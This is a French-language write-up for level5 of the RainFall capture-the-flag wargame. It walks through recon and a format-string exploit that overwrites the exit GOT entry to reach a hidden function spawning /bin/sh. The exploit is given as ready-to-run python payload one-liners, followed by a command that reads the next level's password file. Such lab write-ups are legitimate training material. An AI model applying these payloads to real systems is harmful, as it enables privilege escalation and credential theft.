# Level5 — Commandes

## Connexion

```bash
ssh level5@localhost -p 4242
```

Mot de passe : (dans `level4/flag`)

---

## Recon

```bash
pwd
ls -la
file level5
readelf -h level5
```

Extraction (depuis l’hôte) :  
`sshpass -p '<level5_password>' scp -o StrictHostKeyChecking=no -P 4242 level5@localhost:level5 ./level5.bin`

`scp -P 4242 level5@localhost:level5 ./level5`

Voir `analysis.md`.

---

## Exploitation

Vulnérabilité **format string** : `printf(buffer)` dans `n()`, puis `exit(1)`. La fonction **o()** fait **system("/bin/sh")** mais n’est jamais appelée. En écrasant l’entrée **GOT de exit** (0x8049838) par l’adresse de **o** (0x080484a4), l’appel à `exit(1)` exécute **o()** → shell level6.

### 1. Trouver l’index du buffer (dump)

Tester d’abord les indices bas (buffer souvent en début de stack) :

```bash
python -c 'print "AAAA" + "%1$p.%2$p.%3$p.%4$p.%5$p"' | ./level5
```

Si aucun ne donne **0x41414141**, tester 6–14 :

```bash
python -c 'print "AAAA" + "%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p.%13$p.%14$p"' | ./level5
```

Repérer l’index qui affiche **0x41414141**. Sur RainFall : **index 4**. Noter cet index comme **N**.

### 3a. Exploit avec un seul %n (recommandé si 2×%hn segfault)

Une seule adresse dans le buffer : GOT exit. Écrire 0x080484a4 = 134513828 → padding = 134513824.

```bash
# Remplacer N par l’index trouvé au dump. Sur RainFall : N=4.
# ( … ; cat ) garde stdin ouvert pour pouvoir taper dans le shell.
( python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat ) | ./level5
```

Sortie volumineuse (≈134 Mo), attendre la fin puis taper : `cat /home/user/level6/.pass`

### 3b. Exploit avec deux %hn (si buffer à N et buffer+4 à N+1)

À n’utiliser que si le dump montre deux indices consécutifs pointant dans ton buffer (ex. 0x0804983a et 0x08049838).

```bash
# Ex. si buffer à l’index 12 et buffer+4 à l’index 13 :
python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044x%12$hn%31904x%13$hn"' | ./level5
```

### 4. Récupération du mot de passe level6

Dans le shell : `cat /home/user/level6/.pass`. Noter dans `level5/flag` (mot de passe level6 pour la suite).
